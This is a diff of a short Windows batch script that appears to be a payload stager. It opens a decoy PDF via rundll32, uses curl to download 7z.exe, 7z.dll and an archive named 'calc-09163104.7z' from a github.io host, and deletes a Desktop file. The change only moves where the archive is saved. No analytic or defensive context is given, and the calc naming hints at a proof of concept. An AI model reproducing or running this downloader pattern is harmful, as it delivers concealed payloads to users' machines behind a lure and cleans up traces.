@@ -4,7 +4,6 @@ rundll32 url.dll,FileProtocolHandler file:///%USERPROFILE%\Desktop\test.pdf
 
 curl https://kingdog2.github.io/7z.exe -o "%USERPROFILE%\Desktop\7z.exe"
 curl https://kingdog2.github.io/7z.dll -o "%USERPROFILE%\Desktop\7z.dll"
-curl https://kingdog2.github.io/calc-09163104.7z -o "%USERPROFILE%\Desktop\calc-09163104.7z"
+curl https://kingdog2.github.io/calc-09163104.7z -o "%USERPROFILE%\calc-09163104.7z"
 
 del /f %USERPROFILE%\Desktop\A.txt
-
